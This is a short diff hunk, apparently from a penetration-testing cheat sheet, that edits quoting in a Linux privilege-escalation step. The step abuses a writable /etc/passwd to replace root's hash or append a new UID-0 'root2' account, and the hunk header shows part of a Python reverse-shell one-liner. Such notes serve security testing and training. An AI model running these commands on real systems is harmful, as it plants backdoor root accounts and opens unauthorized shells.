@@ -4019,7 +4019,7 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 - Check if `/etc/passwd` is writable with `ls -l /etc/passwd`
 - Generate a new password hash with `openssl passwd newpass`
 - Substitute the root password hash with the new hash with `nano /etc/passwd`
-  - or add a new root user to `/etc/passwd` with `echo "root2:<password hash>:0:0:root:/root:/bin/bash" >> /etc/passwd`
+  - or add a new root user to `/etc/passwd` with `echo 'root2:<password hash>:0:0:root:/root:/bin/bash' >> /etc/passwd`
     - test the new user with `su root2` and `id`
 
 
